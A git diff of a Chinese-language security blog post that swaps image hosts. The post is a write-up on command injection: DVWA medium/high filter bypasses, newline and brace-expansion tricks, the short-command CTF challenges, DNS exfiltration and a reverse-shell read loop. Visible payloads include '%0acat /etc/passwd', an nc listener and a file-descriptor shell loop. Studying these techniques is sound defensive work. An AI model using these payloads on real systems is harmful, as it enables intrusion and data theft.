 &lt;p>####Command Injection: medium&lt;/p>
@@ -3675,7 +3675,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仅仅只是增加了&lt;code>&amp;amp;&amp;amp;&lt;/code>与&lt;code>;&lt;/code>两个的过滤。然而我们仍然可以使用&lt;code>|&lt;/code>来进行绕过。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>####Command Injection: high&lt;/p>
@@ -3760,7 +3760,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仔细观察，其实&lt;code>|&lt;/code>管道符这里有一个空格，所以我们&lt;code>medium&lt;/code>的&lt;code>payload&lt;/code>还可以继续使用，但是如果真的过滤了&lt;code>|&lt;/code>怎么办呢。我们其实还可以抓包加入&lt;code>%0a&lt;/code>换行符进行一个绕过。使用&lt;code>127.0.0.1 %0acat /etc/passwd&lt;/code>进行绕过&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008189.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008189.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="command-injection-impossible">Command Injection: impossible
@@ -3985,14 +3985,14 @@ loading="lazy"
 &lt;li>
 &lt;p>在&lt;code>url&lt;/code>的编码绕过&lt;/p>
 &lt;p>这里我&lt;code>fuzz&lt;/code>了一下，&lt;code>Linux bash&lt;/code>可以使用&lt;code>%20(space)&lt;/code>、&lt;code>%09(tab)&lt;/code>、&lt;code>%3c(&amp;lt;)&lt;/code>以及&lt;code>+&lt;/code>来绕过&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004461.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004461.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>花括号拓展&lt;code>{OS_COMMAND,ARGUMENT}&lt;/code>&lt;/p>
 &lt;p>在&lt;code>Linux bash&lt;/code>中还可以使用&lt;code>{cat,/etc/passwd}&lt;/code>来绕过&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009158.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009158.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
@@ -4179,7 +4179,7 @@ loading="lazy"
 &lt;h3 id="举个例子-1">举个例子
 &lt;/h3>&lt;h4 id="短命令执行">短命令执行
 &lt;/h4>&lt;p>首先按照前面的&lt;code>&amp;gt;&lt;/code>的用法，我们可以知道有标准输出可以输出到文件，所以&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007866.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007866.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我们有两种构造方式:&lt;/p>
@@ -4202,13 +4202,13 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;/li>
 &lt;/ol>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008039.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008039.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;ol start="2">
 &lt;li>使用&lt;code>\\&lt;/code>，这种方法是利用&lt;code>\&lt;/code>来拼接字符串，其中前一个&lt;code>\&lt;/code>是用来转义后一个&lt;code>\&lt;/code>的。这里需要考虑时间顺序，需要逆序来创建文件。&lt;/li>
 &lt;/ol>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004356.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004356.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-1七字绕过">Example 1 七字绕过
@@ -4358,7 +4358,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里需要我们注意的是&lt;code>cmd &amp;lt;= 5&lt;/code>，所以我们就不能在使用&lt;code>ls -t&amp;gt;a&lt;/code>。&lt;/p>
 &lt;p>但是我们还是可以通过比较巧妙的构造来实现&lt;code>ls -t&amp;gt;a&lt;/code>这么一个操作的。可以先通过把&lt;code>ls -t&amp;gt;a&lt;/code>这样拆分成几段写入到&lt;code>_&lt;/code>文件存放。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008919.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008919.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们就可以看到&lt;code>_&lt;/code>里面的内容，第一行无效命令，2-5行因为末尾有&lt;code>\&lt;/code>连接字符的存在所以可以连接字符串形成&lt;code>ls -t&amp;gt;g&lt;/code>，最后一行执行&lt;code>ls&lt;/code>。所以&lt;code>sh _&lt;/code>我们可以得到当前目录&lt;code>ls -t&amp;gt;g&lt;/code>的效果。达到与&lt;code>Example 1&lt;/code>一致的效果，其他步骤与&lt;code>Example 1&lt;/code>类似，就不再赘述了。下面给出&lt;code>Orange&lt;/code>的&lt;code>exp&lt;/code>&lt;/p>
@@ -4490,27 +4490,27 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这题相比之前又难了一点，这次是&lt;code>cmd &amp;lt;= 4&lt;/code>，但是原理还是一样的。我们要处理的问题还是&lt;code>ls -t&amp;gt;g&lt;/code>这么一个问题。然后因为长度限制，如果我们还用&lt;code>\\&lt;/code>作为字符串连接的话，只剩下两个字符，加上最开始必须要用&lt;code>&amp;gt;&lt;/code>创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如&lt;code>Exmaple 2&lt;/code>中的&lt;code>&amp;gt;\ \\&lt;/code>这里就不能再使用了。但是我们这里再提一个&lt;code>trick&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007665.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007665.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005128.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005128.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>*&lt;/code> 相当于&lt;code>$(dir *)&lt;/code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009411.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009411.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以回到题目，如果按照顺序去创建文件，我们会发现如果直接用&lt;code>*&lt;/code>去执行的话，发现并不可以，因为按照&lt;code>dir&lt;/code>的文件排序，&lt;code>-t&lt;/code>也是排在最前面。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008096.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008096.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>所以我们还需要参考一下&lt;code>alphabetical&lt;/code>来排序，这里就不要用&lt;code>Docker&lt;/code>来做了，因为&lt;code>busybox&lt;/code>里面一些东西还是跟真实环境优点区别的。&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000746.jpg"
+&lt;p>所以我们还需要参考一下&lt;code>alphabetical&lt;/code>来排序，这里就不要用&lt;code>Docker&lt;/code>来做了，因为&lt;code>busybox&lt;/code>里面一些东西还是跟真实环境优点区别的。&lt;img src="https://blogpic.zdy.one/img/20190610000746.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以如果我们需要运用&lt;code>-&lt;/code>字符的话，他会排在最前面，这里就比较坑了。所以我们需要想个办法把&lt;code>-t&lt;/code>置于后面。&lt;/p>
 &lt;p>这里我们可以使用&lt;code>t-&lt;/code>这种逆序的模式把&lt;code>t&lt;/code>放到前面来，就可以比较正常的排序了。&lt;/p>
 &lt;p>逆序的命令我们可以用&lt;code>rev&lt;/code>来实现，另外我们还需要一个字母比较靠前的命令来展示当前目录，我们可以采用&lt;code>dir&lt;/code>来展示当前目录，同时&lt;code>d&lt;/code>字母也比较靠前，不要像&lt;code>ls&lt;/code>特别考虑排序的问题。所以我们大概可以通过这么一个形式去构造&lt;code>ls -t&amp;gt;g&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008113.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008113.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里可能有几个让大家比较疑惑的地方，比如为什么是&lt;code>&amp;gt;ht-&lt;/code>，个人理解是因为&lt;code>ls&lt;/code>逆序是&lt;code>sl&lt;/code>，&lt;code>s&lt;/code>是排在&lt;code>t&lt;/code>前的，如果不加&lt;code>h&lt;/code>，&lt;code>t-&lt;/code>会在&lt;code>sl&lt;/code>之后，而且&lt;code>ls -th&lt;/code>与&lt;code>ls -t&lt;/code>效果是一样的，然后我们再找一个&lt;code>h&lt;/code>之前的字母做输出文件就可以了。还有一个地方就是&lt;code>*v&amp;gt;x&lt;/code>，之前我们讲过了通配符以及&lt;code>*&lt;/code>的作用，这里&lt;code>*v&lt;/code>就相当于&lt;code>$(dir *v)&amp;gt;x&lt;/code>，&lt;code>dir *v&lt;/code>返回的就是结尾为&lt;code>v&lt;/code>的文件，这里就是&lt;code>rev&lt;/code>与&lt;code>v&lt;/code>两个文件，如果只有相当于先把&lt;code>v&lt;/code>文件内容进行逆序，而后再输入到&lt;code>x&lt;/code>文件，这样整个&lt;code>ls -t&amp;gt;g&lt;/code>的命令拼凑就完成了，接着方法就有很多种了，比较简单的就是直接&lt;code>wget&lt;/code>或者&lt;code>curl&lt;/code>一个&lt;code>webshell&lt;/code>到服务器上就好了，就不再赘述了。&lt;/p>
@@ -4633,10 +4633,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个用起来比较简单，直接去查看对应的记录就好了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005118.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005118.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000939.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000939.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>有时候你需要编码想要读出来的内容，这样才不会由于一些空格或者什么其他字符导致读不完整数据。&lt;/p>
@@ -4663,10 +4663,10 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -l -n -vv -p &lt;span class="m">53&lt;/span> -u -k&lt;span class="o">(&lt;/span>如果不支持-k也可以不用-k&lt;span class="o">)&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004044.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004044.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008182.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008182.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Same:&lt;/p>
@@ -4873,10 +4873,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ cat &amp;lt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="nv">$line&lt;/span> 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &amp;gt;&lt;span class="p">&amp;amp;&lt;/span>5&lt;span class="p">;&lt;/span> &lt;span class="k">done&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000724.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000724.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003384.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003384.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>nc&lt;/code>方式&lt;/p>
